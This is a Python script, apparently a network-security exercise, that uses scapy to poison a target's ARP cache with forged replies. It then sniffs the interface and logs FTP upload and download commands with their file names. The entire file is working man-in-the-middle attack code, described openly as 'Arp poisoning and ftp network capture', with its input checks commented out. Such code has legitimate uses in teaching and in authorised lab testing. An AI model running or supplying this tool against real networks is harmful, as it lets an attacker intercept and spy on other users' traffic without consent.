from functools import partial
import scapy.all as scapy
import ipaddress
import netifaces
import argparse
import sys
import re
import os

def spoof(args):
    target_spoof_packet = scapy.ARP(op=2, pdst=args.IP_target, psrc=args.IP_src, hwsrc=args.MAC_src, hwdest=args.MAC_target)
    scapy.sendp(target_spoof_packet, iface=args.interf)


def packet_callback(pkt, args):
    if pkt.haslayer('ARP'):
        sender_mac = pkt['Ether'].src
        sender_ip = pkt['ARP'].psrc
        target_ip = pkt['ARP'].pdst
        print(f"ARP Request - Sender MAC: {sender_mac}, Sender IP: {sender_ip}, Target IP: {target_ip}")
        if sender_mac == args.MAC_target and sender_ip == args.IP_target and target_ip == args.IP_src:
            spoof(args)

    if pkt.haslayer('TCP') and pkt.haslayer('IP'):
        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
            if hasattr(pkt, 'load'):
                payload = pkt.load.decode('utf-8', errors='ignore')
                if payload.startswith('STOR') or payload.startswith('RETR'):
                    command, file_name = payload.split(' ', 1)
                    print(f"Command: {command}, File Name: {file_name.strip()}")

def sniff_for_packets(args):
    capture = scapy.sniff(iface=args.interf, prn=partial(packet_callback, args=args))

def main():
    if os.geteuid() != 0:
        exit('You have to run the progam as sudo')
    parser = argparse.ArgumentParser(description='Arp poisoning and ftp network capture')
    parser.add_argument('IP_src', type=str, help='Requested IP address to capture')
    parser.add_argument('MAC_src', type=str, help='MAC address used for spoofing arp tables')
    parser.add_argument('IP_target', type=str, help='Requestor IP address')
    parser.add_argument('MAC_target', type=str, help='Requestor MAC address')
    parser.add_argument('interf', type=str, help='Interface to listen on')
    parser.add_argument('-v', action='store_true', default=False, help='Verbose mode')
    args = parser.parse_args()

#    try:
#        if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_src.lower()):
#            raise Exception(f'{args.MAC_src} is an invalid mac address')
#        if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_target.lower()):
#            raise Exception(f'{args.MAC_target} is an invalid mac address')
#        s_ip = ipaddress.IPv4Address(args.IP_src)
#        t_ip=ipaddress.IPv4Address(args.IP_target)
#        if args.interf not in netifaces.interfaces():
#            raise Exception(f'{args.interf} is not an available interface')
    sniff_for_packets(args)
#    except Exception as e:
#        parser.error(e)
#    except KeyboardInterrupt as e:
#        print(e)
#        return (0)

if __name__=='__main__':
    main()
